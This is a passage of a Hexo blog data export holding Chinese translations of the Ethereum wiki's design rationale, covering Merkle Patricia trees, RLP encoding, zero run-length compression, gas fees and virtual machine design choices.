compress('\\xf8\\xaf\\xf8\\xab\\xa0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xbe{b\\xd5\\xcd\\x8d\\x87\\x97')\n'\\xf8\\xaf\\xf8\\xab\\xa0\\xfe\\x9e\\xbe{b\\xd5\\xcd\\x8d\\x87\\x97'\n>>> compress(\"\\xc5\\xd2F\\x01\\x86\\xf7#<\\x92~}\\xb2\\xdc\\xc7\\x03\\xc0\\xe5\\x00\\xb6S\\xca\\x82';{\\xfa\\xd8\\x04]\\x85\\xa4p\")'\\xfe\\x01'\n\t\t\t```\n\n在压缩算法出现之前，以太坊协议中的很多部分都有大量的特殊情况。比如，`sha3` 常常被覆盖，这样 `sha3('')=''`，从而无需存储代码或者在账户中存储，由此会节省 64 个字节。但是，最近所有的这些特殊情况都被移除了 - 这使得以太坊数据结构在默认情况下变得非常庞大，取而代之的是将数据保存功能添加到区块链协议层之外的层级，添加方式是将其利用有线协议无缝插入用户的数据库实现。 这增加了模块性，简化了共识层，并且还允许相对容易地部署压缩算法的升级（例如，通过网络协议版本）。\n","slug":"以太坊wiki-设计原理翻译二","published":1,"updated":"2018-03-09T09:32:59.581Z","layout":"post","photos":[],"link":"","_id":"cjf7piavd000npkwo3peccxbr","content":"<p><a href=\"https://xingyunbite.github.io/2018/02/09/%E4%BB%A5%E5%A4%AA%E5%9D%8Awiki-%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86%E7%BF%BB%E8%AF%91%E4%B8%80/\" target=\"_blank\" rel=\"noopener\">以太坊wiki-设计原理翻译一</a></p>\n<h2 id=\"默克尔帕夏里克树\"><a href=\"#默克尔帕夏里克树\" class=\"headerlink\" title=\"默克尔帕夏里克树\"></a>默克尔帕夏里克树</h2><p>默克尔帕夏里克树（<code>Merkle Patricia tree/trie</code>），以前由 Alan Reiner 设想并在 Ripple 协议中实现，是以太坊中的基本数据结构，被用来存储所有的账户状态，以及区块中的交易和收据。<code>MPT</code> 是 <code>Merkle tree</code> 和 <code>Patricia tree</code> 的结合，以两者的元素来创建具有以下两个属性的结构：</p>\n<ol>\n<li>每一组唯一的键/值对唯一地映射到一个根散列，并且不可能欺骗一棵树中的键/值对的成员（除非攻击者具有〜2 ^ 128 的计算能力）</li>\n<li>在对数时间内进行修改，添加和删除键值对。</li>\n</ol>\n<p>这为我们提供了一种高效、更新容易的方法，来对我们整个状态树进行“指纹”操作。以太坊 <code>MPT</code> 的正式描述如下：<a href=\"https://github.com/ethereum/wiki/wiki/Patricia-Tree\" target=\"_blank\" rel=\"noopener\">https://github.com/ethereum/wiki/wiki/Patricia-Tree</a></p>\n<p><code>MPT</code> 中详细的设计决定包括：</p>\n<ol>\n<li><strong>拥有两种节点类别</strong>：<code>kv</code> 节点和分叉节点（从 <code>MPT</code> 详解中获得更多信息）。<code>kv</code> 节点的存在提高了效率，因为如果一棵树在特定区域稀疏，<code>kv</code> 节点就可以作为“快捷方式”，从而不需要深度为 64 的树。</li>\n<li><strong>使分叉节点为 6 而不是 2</strong>：这是为了提升查找效率。我们现在认识到这个选择并不理想，因为可以通过存储批量节点，以二进制模式模拟六叉树的查找效率。然而，由于树结构在实现中很容易出现错误，而导致根不匹配，所以我们决定把它推迟到 <code>1.1</code>。</li>\n<li><strong>空值和“没有成员”之间没有区别</strong>：这是为了简单起见，并且因为以太坊的默认值通常意味着零（如 余额（balance）），而且空字符串被用来表示零，所以实际运行起来也没有任何问题。</li>\n<li><strong>终止和非终止节点之间的区别</strong>：从技术上讲，“这个节点终止”标志是不必要的，因为以太坊中的所有树都用来存储静态键长度，但是为了增加通用性，我们添加了它，并且希望其他加密协议也能够使用以太坊中 <code>MPT</code> 的实现方式。</li>\n<li><strong>使用 <code>sha3(k)</code> 作为 “安全树（secure tree）” 中的键（在状态和账户存储中使用）</strong>：这会使得「通过设置一个分叉了 64 层级深的节点的最大不利链，然后在这上面不断调用 <code>SLOAD</code> 和 <code>SSTORE</code>」这样的方式，对树进行 <code>DoS</code> 攻击会十分困难。同时请注意，这将使枚举树更加困难。 如果你想在你的客户端拥有枚举功能，最简单的方法是维护一个数据库映射 <code>sha3（k） - &gt; k</code>。</li>\n</ol>\n<h2 id=\"RLP\"><a href=\"#RLP\" class=\"headerlink\" title=\"RLP\"></a>RLP</h2><p><code>RLP</code>（递归长度前缀）编码是以太坊中使用的主要序列化格式，并且被使用于任何地方 - 区块，交易，账户状态和信息传递协议。<code>RLP</code> 的正式描述如下：<a href=\"https://github.com/ethereum/wiki/wiki/RLP\" target=\"_blank\" rel=\"noopener\">https://github.com/ethereum/wiki/wiki/RLP</a></p>\n<p><code>RLP</code> 旨在成为高度简约的序列化格式，它唯一的目的是存储嵌套的字节数组。不像 <a href=\"https://developers.google.com/protocol-buffers/docs/pythontutorial\" target=\"_blank\" rel=\"noopener\"><code>protobuf</code></a>，<a href=\"http://bsonspec.org/\" target=\"_blank\" rel=\"noopener\"><code>BSON</code></a> 和其他解决方式，<code>RLP</code> 并不想定义任何具体的数据类型，如 <code>booleans, floats, doubles</code> 或者 <code>integers</code>，相反，它只是以嵌套数组的形式存储结构，并将其留给协议来确定数组的含义。键/值映射也不被明确支持; 支持键/值映射的半官方建议是将这些映射表示为<code>[[k1，v1]，[k2，v2]，...]</code>，其中 <code>k1，k2 ...</code> 使用字符串的标准排序来排序。</p>\n<p><code>RLP</code> 的备选方案可以使用已经存在的算法如 <code>protobuf</code> 或者 <code>BSON</code>，但我们更青睐 <code>RLP</code> 的原因是：(1) 实现方式简单。（2）保证绝对的字节完美一致性。许多语言中的键/值映射没有明确的顺序，浮点格式有许多特殊情况，这可能导致相同的数据使用不同的编码，因此产生不同的哈希。我们可以内部开发一个协议来确定解决这些问题（这是一个普遍的原则，也适用于代码的其他部分，例如 <code>VM</code>）。注意 <code>BitTorrent</code> 使用的 <code>bencode</code>，可能为 <code>RLP</code> 提供了一个可行的替代方案，尽管其使用十进制编码的长度使得它与二进制 <code>RLP</code> 相比稍微不太理想。</p>\n<h2 id=\"压缩算法\"><a href=\"#压缩算法\" class=\"headerlink\" title=\"压缩算法\"></a>压缩算法</h2><p>有线协议和数据库都使用了定制的压缩算法来存储数据。该算法最好的描述为运行长度编码零（<code>run-length-encoding zeroes</code>），并保留其他值，除了像 <code>sha3（&#39;&#39;）</code> 这样的常见值的一些特殊情况例外。例如：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt; compress(&apos;horse&apos;)</span><br><span class=\"line\">&apos;horse&apos;</span><br><span class=\"line\">&gt;&gt;&gt; compress(&apos;donkey dragon 1231231243&apos;)</span><br><span class=\"line\">&apos;donkey dragon 1231231243&apos;</span><br><span class=\"line\">&gt;&gt;&gt; compress(&apos;\\xf8\\xaf\\xf8\\xab\\xa0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xbe&#123;b\\xd5\\xcd\\x8d\\x87\\x97&apos;)</span><br><span class=\"line\">&apos;\\xf8\\xaf\\xf8\\xab\\xa0\\xfe\\x9e\\xbe&#123;b\\xd5\\xcd\\x8d\\x87\\x97&apos;</span><br><span class=\"line\">&gt;&gt;&gt; compress(&quot;\\xc5\\xd2F\\x01\\x86\\xf7#&lt;\\x92~&#125;\\xb2\\xdc\\xc7\\x03\\xc0\\xe5\\x00\\xb6S\\xca\\x82&apos;;&#123;\\xfa\\xd8\\x04]\\x85\\xa4p&quot;)&apos;\\xfe\\x01&apos;</span><br></pre></td></tr></table></figure>\n<p>在压缩算法出现之前，以太坊协议中的很多部分都有大量的特殊情况。比如，<code>sha3</code> 常常被覆盖，这样 <code>sha3(&#39;&#39;)=&#39;&#39;</code>，从而无需存储代码或者在账户中存储，由此会节省 64 个字节。但是，最近所有的这些特殊情况都被移除了 - 这使得以太坊数据结构在默认情况下变得非常庞大，取而代之的是将数据保存功能添加到区块链协议层之外的层级，添加方式是将其利用有线协议无缝插入用户的数据库实现。 这增加了模块性，简化了共识层，并且还允许相对容易地部署压缩算法的升级（例如，通过网络协议版本）。</p>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"https://xingyunbite.github.io/2018/02/09/%E4%BB%A5%E5%A4%AA%E5%9D%8Awiki-%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86%E7%BF%BB%E8%AF%91%E4%B8%80/\" target=\"_blank\" rel=\"noopener\">以太坊wiki-设计原理翻译一</a></p>\n<h2 id=\"默克尔帕夏里克树\"><a href=\"#默克尔帕夏里克树\" class=\"headerlink\" title=\"默克尔帕夏里克树\"></a>默克尔帕夏里克树</h2><p>默克尔帕夏里克树（<code>Merkle Patricia tree/trie</code>），以前由 Alan Reiner 设想并在 Ripple 协议中实现，是以太坊中的基本数据结构，被用来存储所有的账户状态，以及区块中的交易和收据。<code>MPT</code> 是 <code>Merkle tree</code> 和 <code>Patricia tree</code> 的结合，以两者的元素来创建具有以下两个属性的结构：</p>\n<ol>\n<li>每一组唯一的键/值对唯一地映射到一个根散列，并且不可能欺骗一棵树中的键/值对的成员（除非攻击者具有〜2 ^ 128 的计算能力）</li>\n<li>在对数时间内进行修改，添加和删除键值对。</li>\n</ol>\n<p>这为我们提供了一种高效、更新容易的方法，来对我们整个状态树进行“指纹”操作。以太坊 <code>MPT</code> 的正式描述如下：<a href=\"https://github.com/ethereum/wiki/wiki/Patricia-Tree\" target=\"_blank\" rel=\"noopener\">https://github.com/ethereum/wiki/wiki/Patricia-Tree</a></p>\n<p><code>MPT</code> 中详细的设计决定包括：</p>\n<ol>\n<li><strong>拥有两种节点类别</strong>：<code>kv</code> 节点和分叉节点（从 <code>MPT</code> 详解中获得更多信息）。<code>kv</code> 节点的存在提高了效率，因为如果一棵树在特定区域稀疏，<code>kv</code> 节点就可以作为“快捷方式”，从而不需要深度为 64 的树。</li>\n<li><strong>使分叉节点为 6 而不是 2</strong>：这是为了提升查找效率。我们现在认识到这个选择并不理想，因为可以通过存储批量节点，以二进制模式模拟六叉树的查找效率。然而，由于树结构在实现中很容易出现错误，而导致根不匹配，所以我们决定把它推迟到 <code>1.1</code>。</li>\n<li><strong>空值和“没有成员”之间没有区别</strong>：这是为了简单起见，并且因为以太坊的默认值通常意味着零（如 余额（balance）），而且空字符串被用来表示零，所以实际运行起来也没有任何问题。</li>\n<li><strong>终止和非终止节点之间的区别</strong>：从技术上讲，“这个节点终止”标志是不必要的，因为以太坊中的所有树都用来存储静态键长度，但是为了增加通用性，我们添加了它，并且希望其他加密协议也能够使用以太坊中 <code>MPT</code> 的实现方式。</li>\n<li><strong>使用 <code>sha3(k)</code> 作为 “安全树（secure tree）” 中的键（在状态和账户存储中使用）</strong>：这会使得「通过设置一个分叉了 64 层级深的节点的最大不利链，然后在这上面不断调用 <code>SLOAD</code> 和 <code>SSTORE</code>」这样的方式，对树进行 <code>DoS</code> 攻击会十分困难。同时请注意，这将使枚举树更加困难。 如果你想在你的客户端拥有枚举功能，最简单的方法是维护一个数据库映射 <code>sha3（k） - &gt; k</code>。</li>\n</ol>\n<h2 id=\"RLP\"><a href=\"#RLP\" class=\"headerlink\" title=\"RLP\"></a>RLP</h2><p><code>RLP</code>（递归长度前缀）编码是以太坊中使用的主要序列化格式，并且被使用于任何地方 - 区块，交易，账户状态和信息传递协议。<code>RLP</code> 的正式描述如下：<a href=\"https://github.com/ethereum/wiki/wiki/RLP\" target=\"_blank\" rel=\"noopener\">https://github.com/ethereum/wiki/wiki/RLP</a></p>\n<p><code>RLP</code> 旨在成为高度简约的序列化格式，它唯一的目的是存储嵌套的字节数组。不像 <a href=\"https://developers.google.com/protocol-buffers/docs/pythontutorial\" target=\"_blank\" rel=\"noopener\"><code>protobuf</code></a>，<a href=\"http://bsonspec.org/\" target=\"_blank\" rel=\"noopener\"><code>BSON</code></a> 和其他解决方式，<code>RLP</code> 并不想定义任何具体的数据类型，如 <code>booleans, floats, doubles</code> 或者 <code>integers</code>，相反，它只是以嵌套数组的形式存储结构，并将其留给协议来确定数组的含义。键/值映射也不被明确支持; 支持键/值映射的半官方建议是将这些映射表示为<code>[[k1，v1]，[k2，v2]，...]</code>，其中 <code>k1，k2 ...</code> 使用字符串的标准排序来排序。</p>\n<p><code>RLP</code> 的备选方案可以使用已经存在的算法如 <code>protobuf</code> 或者 <code>BSON</code>，但我们更青睐 <code>RLP</code> 的原因是：(1) 实现方式简单。（2）保证绝对的字节完美一致性。许多语言中的键/值映射没有明确的顺序，浮点格式有许多特殊情况，这可能导致相同的数据使用不同的编码，因此产生不同的哈希。我们可以内部开发一个协议来确定解决这些问题（这是一个普遍的原则，也适用于代码的其他部分，例如 <code>VM</code>）。注意 <code>BitTorrent</code> 使用的 <code>bencode</code>，可能为 <code>RLP</code> 提供了一个可行的替代方案，尽管其使用十进制编码的长度使得它与二进制 <code>RLP</code> 相比稍微不太理想。</p>\n<h2 id=\"压缩算法\"><a href=\"#压缩算法\" class=\"headerlink\" title=\"压缩算法\"></a>压缩算法</h2><p>有线协议和数据库都使用了定制的压缩算法来存储数据。该算法最好的描述为运行长度编码零（<code>run-length-encoding zeroes</code>），并保留其他值，除了像 <code>sha3（&#39;&#39;）</code> 这样的常见值的一些特殊情况例外。例如：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt; compress(&apos;horse&apos;)</span><br><span class=\"line\">&apos;horse&apos;</span><br><span class=\"line\">&gt;&gt;&gt; compress(&apos;donkey dragon 1231231243&apos;)</span><br><span class=\"line\">&apos;donkey dragon 1231231243&apos;</span><br><span class=\"line\">&gt;&gt;&gt; compress(&apos;\\xf8\\xaf\\xf8\\xab\\xa0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xbe&#123;b\\xd5\\xcd\\x8d\\x87\\x97&apos;)</span><br><span class=\"line\">&apos;\\xf8\\xaf\\xf8\\xab\\xa0\\xfe\\x9e\\xbe&#123;b\\xd5\\xcd\\x8d\\x87\\x97&apos;</span><br><span class=\"line\">&gt;&gt;&gt; compress(&quot;\\xc5\\xd2F\\x01\\x86\\xf7#&lt;\\x92~&#125;\\xb2\\xdc\\xc7\\x03\\xc0\\xe5\\x00\\xb6S\\xca\\x82&apos;;&#123;\\xfa\\xd8\\x04]\\x85\\xa4p&quot;)&apos;\\xfe\\x01&apos;</span><br></pre></td></tr></table></figure>\n<p>在压缩算法出现之前，以太坊协议中的很多部分都有大量的特殊情况。比如，<code>sha3</code> 常常被覆盖，这样 <code>sha3(&#39;&#39;)=&#39;&#39;</code>，从而无需存储代码或者在账户中存储，由此会节省 64 个字节。但是，最近所有的这些特殊情况都被移除了 - 这使得以太坊数据结构在默认情况下变得非常庞大，取而代之的是将数据保存功能添加到区块链协议层之外的层级，添加方式是将其利用有线协议无缝插入用户的数据库实现。 这增加了模块性，简化了共识层，并且还允许相对容易地部署压缩算法的升级（例如，通过网络协议版本）。</p>\n"},{"title":"以太坊wiki-设计原理翻译四","comments":0,"date":"2018-02-24T03:01:05.000Z","img":null,"_content":"\n[以太坊wiki-设计原理翻译三](https://xingyunbite.github.io/2018/02/24/%E4%BB%A5%E5%A4%AA%E5%9D%8Awiki-%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86%E7%BF%BB%E8%AF%91%E4%B8%89/)\n\n## 燃料和手续费\n\n比特币中的交易大致相同，因此它们在网络上的成本可以抽象成一个模型，而以太坊中的交易则更复杂，交易费用系统需要考虑许多因素，包括带宽成本 ，存储成本和计算成本。特别重要的是，以太坊编程语言是图灵完备的，因此交易可以使用任意数量的带宽，存储和计算，并且因为不能提前可靠地预估暂停的问题，算力可能被大量使用。所以防止通过无限循环进行的拒绝服务攻击是一个关键目标。\n\n交易手续费的基本机制如下：\n* 每笔交易都需要指定一定数量愿意被花费的燃料（被称作 `startgas`），以及愿意为每单位燃料支付的价格（`gasprice`）。在执行之初，`startgas * gasprice` 这么多的 `ether` 会从交易发送者的账户中被扣除。\n* 交易执行期间的所有操作，包括数据库的读写，消息，和虚拟机中的每个计算步骤，都会消耗一定数量的燃料。\n* 如果一笔交易执行被完整地处理，消耗的燃料比它限定的燃料少，那么该剩余的燃料被称作 `gas_rem`。一笔交易首先会正常执行，然后在交易执行的最后，交易发送者会收到一笔退款 `gas_rem * gasprice`，矿工会收到一笔 `(startgas - gas_rem) * gasprice` 的奖励。\n* 如果在交易执行过程中，燃料耗尽，那么所有的执行都会被回滚，而交易也依旧未被验证。该交易的唯一影响是 `startgas * gasprice` 会被转给矿工。\n* 当一个合约发送一个消息给另一个合约，它也可以设置一个燃料限定值来指定由该消息引起的子执行操作。如果该执行耗尽燃料，那么一切回滚，而燃料也会被消耗。\n\n以上的每个部分都是必要的。例如：\n* 如果交易不需要指定燃料限制，那么恶意用户可以发送一笔进行数十亿循环的交易，因为处理这样的交易将花费比块间隔更长的时间，所以没有人能够处理它， 但矿工们无法预知该交易的存在，那么就会导致拒绝服务漏洞。\n* 将时间限制替代燃料限制，并不会起作用，因为这太主观了（有些机器比其他机器更快，甚至在相同的机器中也总是存在闭合调用）。\n* 整个值 `startgas * gasprice` 必须在开始时即作为押金取出，这样就不会出现账户在执行中“破产”并且无法支付燃料的情况。 请注意，余额检查是不够的，因为帐户可以在其他地方发送余额。\n* 如果在燃料不足的错误下，执行没有回滚，那么合约就需要采取强有力但是困难的安全措施，以防止自身被交易或消息利用而提供只能运行到一半的燃料，从而导致当前正在执行的合约发生一些变化。\n* 如果子限制不存在，那么敌对账户可以通过与其签订协议来制定对其他合同的拒绝服务攻击，然后在计算开始时插入无限循环，这样受害者合约中的任何企图补偿攻击合约（any attempts by the victim contract to compensate the attack contract）或向其发送消息的行为都会使整个交易执行陷于瘫痪。\n* 要求交易发送者支付燃料而不是合约来支付，大大提高了开发者的可用性。以太坊的早期版本有支付燃料的合约，但是这导致了一个相当丑的问题，即每个合约都必须实施“守卫”代码，以确保每一个传入的消息都足以补偿合约以足以支付燃料的消耗。\n\n注意燃料消耗的特定的特性：\n* 21000 单位的燃料是一笔交易的基本手续费。这涵盖了从签名中恢复发件人地址以及存储交易的空间和带宽空间的椭圆曲线操作的成本。\n* 一笔交易可以包括无限的数据，虚拟机提供了操作码使得合约接受交易来访问数据。固定燃料手续费为，每个 0 字节 4 单位燃料，每个非 0 字节 68 单位燃料。这个公式是因为我们注意到用户写的合约中的大多数交易数据都被组织成一系列 32 字节的参数，其中大部分都有前导 0 字节，虽然这样的构造看起来似乎没有效率，但是由于压缩算法的存在，这样反而十分有效率，我们希望鼓励使用它们来代替更复杂的机制，以便根据预期的字节数来压缩参数，从而在编译器级别增加复杂性。这是三明治复杂性模型的一个例外，但是由于成本与收益的比例，这是合理的。\n* `SSTORE` 操作符会在账户的存储空间中设置变量，它的消耗如下：(i) 将一个为零的变量改为非零时，为 20000 单位的燃料，(ii) 将一个零变量改为零变量，将一个非零变量改为非零变量时，为 5000 单位燃料，(iii) 将非零变量改为零变量时，为 5000 单位燃料，加上在成功交易执行结束时提供的 20000 单位燃料退款。（plus a 20000 gas refund to be given at the end of successful transaction execution）（即不是执行导致的燃料耗尽异常）。退款最高为交易花费的全部燃料的一半。这提供了一个小小的激励来清空存储空间，因为我们注意到，没有这样的激励的话，很多合约都会留下一些未使用的存储空间，导致快速膨胀增加体积，为存储“收取租金”提供了很多好处，同时也没有风险，一个被放置好的合同将永远存在。延迟退款机制对于防止拒绝服务攻击是必要的，攻击者会发送具有少量燃料的交易，在一个运行很长时间的循环中频繁清空大量的存储空间，这样会很快耗尽燃料，也会消耗验证者大量的算力，但这个操作实际上却并没有清空存储空间或者花费大量的燃料。50% 的上限是为了确保一个矿工在获得具有一定数量燃料的交易后仍然可以确定执行交易的计算时间的上限。\n* 合约提供的消息中的数据不会消耗燃料。这是因为在消息调用期间不需要真正“复制”任何数据，因为调用数据可以简单地看作是指向父合约的内存的指针，它在子进程执行期间不会改变。\n* 内存是一个无限可扩展的阵列。 但是，每 32 字节的内存扩展会消耗一个单位的燃料，这里会四舍五入。\n* 一些计算时间高度依赖于参数的操作码，拥有不同的燃料消耗值。比如，指数的燃料消耗为 10 加上指数中的每字节的 10 单位（即 x^0 = 1 燃料，x^1...x^255 = 2 燃料，x^256...x^65535 = 3 燃料 等等），而复制操作码（`CALLDATACOPY, CODECOPY, EXTCODECOPY`）的燃料消耗为 1 加上每 32 字节的一单位燃料，这里四舍五入（`LOG` 拥有类似的规则）。内存膨胀的燃料成本不足以弥补这一缺陷，因为它打开了一次二次攻击（50000 轮的 50000 单位燃料的 `CALLDATACOPY` 约为 50000 ^ 2 的计算量，但在引入可变燃料成本之前只有约 50000 单位燃料）\n* 如果值非零，那么`CALL` 操作码（和对称的 `CALLCODE`）花费额外的 9000 单位燃料。这是因为任意值转移都会导致存档节点的历史存储空间严重膨胀。注意，实际的手续费为 6700；在这之上我们强制增加了一个最低为 2300 单位的燃料用来自动给收据。这是为了确保收到交易的钱包至少有足额的燃料来记录该交易。\n\n燃料机制的另一个重要的部分是燃料价格本身的经济性。比特币中使用的默认方法是完全自愿的手续费，依靠矿工设置动态的最低值来扮演一个守门人的角色；与之相对的，在以太坊中，允许交易发送者设置任意的燃料消耗。这种方式在比特币社区中十分受欢迎，因为它是基于市场的，允许矿工和交易发送者之间的供需关系决定价格。然而这里存在一个问题，交易处理并不是市场；尽管将交易处理作为矿工提供给发送方的服务具有直接的吸引力，但实际上，矿工打包的每笔交易都需要被网络上的每个节点处理，因此绝大多数交易处理成本由第三方承担，而不是决定是否打包该交易的矿工。因此，很可能会发生普遍灾难（tragedy-of-the-commons）的问题。\n\n目前，由于缺少关于矿工实际上是如何处理的详细信息，我们实施了一个相当简单的方法：一个投票系统。矿工拥有权力对当前的区块设置燃料限制，该限制与上一个区块的燃料限制可以有大约 0.0975%（1/1024）的浮动，因此产生的燃料限制应该为矿工偏好的中位数。我们希望将来能够将其分解为更精确的算法。\n\n## 虚拟机\n\n以太坊虚拟机是交易码执行的引擎，也是以太坊和其他系统不同的核心特性。注意，将 *虚拟机* 和 *合约* 与 *消息模型* 分别看待，比如， `SIGNEXTEND` 操作码是虚拟机的一个特性，而合约可以调用其他合约，指定子调用的燃料限制是合约和消息的一部分。以太坊虚拟机的设计目的包括：\n\n* **简单**：尽可能少的底层操作码，尽可能少的数据类型，以及尽可能少的虚拟机层次的结构。\n* **完全明确**：在虚拟机的说明中绝对不允许存在模棱两可的情况，并且结果必须是完全确定的。另外，应该有一个精确的计算步骤的概念，可以测量计算燃料的消耗。\n* **节省空间**：以太坊虚拟机组件应尽可能紧凑（例如，默认 C 程序的 4000 字节基本大小是不可接受的）。\n* **期望的应用的专业能力（Specialization to expected applications）**：有能力处理 20 字节地址 和自定义的32 字节变量的加密，自定义加密中的模块化算法，读取区块和交易数据，与状态交互等等。\n* **简单的安全**：应该很容易就能够想出操作符的燃料消耗模型，该模型使得虚拟机无法被利用。\n* **优化友好**：应该很容易优化，以便可以构建 `JIT` 编译的和其他速度更快的 `VM` 版本。\n\n一些特殊的设计决定如下：\n* **临时/永久存储的区别** - 存在于虚拟机的每个实例内并在虚拟机执行完成时消失的临时存储与基于每个账户的存在于区块链状态级别上的永久存储之间存在区别。比如，假设执行下列执行树（使用 S 代表永久存储，M 代表临时存储）：（i） A 调用 B，（ii） B 设置 `B.S[0] = 5`，`B.M[0] = 9`，（iii） B 调用 C，（iv）C 调用 B。在此时，如果 B 树读取 `B.S[0]`，它会获取到之前存储在 B 中的值，但是 B 树读取 `B.M[0]`，它回返回 0，因为在虚拟机的临时存储中这个一个新的实例。如果 B 在这个内部调用中设置 `B.M[0] = 13` 和 `B.S[0] = 17`，然后这个内部调用和 C 的调用终止，使得执行回到 B 的外部调用，然后 B 读取 M，将会看到 `B.M[0] = 9`(自上次设置此值在同一个 VM 执行实例中) 和 `B.S[0] = 17`。如果 B 的外部调用终止，A 再次调用 B，然后 B 会看到 `B.M[0] = 0` 和 `B.S[0] = 17`。这种区别的目的是（1）为每个执行实例提供自己的内存，这些内存不会受到递归调用的破坏，使安全编程变得更加容易，并且（2）提供一种可以非常快地操作的内存形式， 因为需要修改树，所以存储更新的速度一定很慢。\n* **栈/内存模型** - 早期做出的决定有三种计算状态（除了指向下一条指令的程序计数器外）：栈（一种标准的先进后出的 32 字节变量栈），内存（一种无限可扩展的临时字节数组）和存储（永久存储）。在临时存储方面，堆栈和内存的替代方案是一个仅限内存的范例，或者是寄存器和内存的混合（不是很不相同，因为从根本上说寄存器也是一种内存）。在这个例子中，每个命令会有三个参数，如 `ADD R1 R2 R3:M[R1] = M[R2] + M[R3]`。选择堆栈范例的原因很明显，它使代码缩小了四倍。\n* **32 字节字大小** - 与其他大多数架构一样，替代方案是 4 或 8 个字节的字，或者像比特币一样是无限的字。4 字节或 8 字节字太严格，无法存储加密计算的地址和很大的值，而无限的值则很难根据其建立一个安全的燃料模型。32 字节是理想的，因为它足够大以存储许多加密实现中常见的 32 字节值，以及地址（并提供将地址和值打包到单个存储索引中的优化能力），但又不会太大以至于效率变得极低。\n* **拥有我们自己的虚拟机** - 替代方案是使用 `Java`，或者一些 `Lisp dialect`，或者 `Lua`。我们认为拥有一个专门的虚拟机是合适的，因为（i）我们的虚拟机规格比许多其他虚拟机简单得多，因为其他虚拟机必须为复杂性付出更低的成本，而在我们的情况下，每次增加复杂性都是朝着创建开发集中化和可能存在包括共识失败的安全漏洞这样的高门槛迈出的一步（whereas in our case every additional unit of complexity is a step toward high barriers of entry creating development centralization and potential for security flaws including consensus failures,），（ii）它使我们能够更专业化虚拟机，例如，通过具有 32 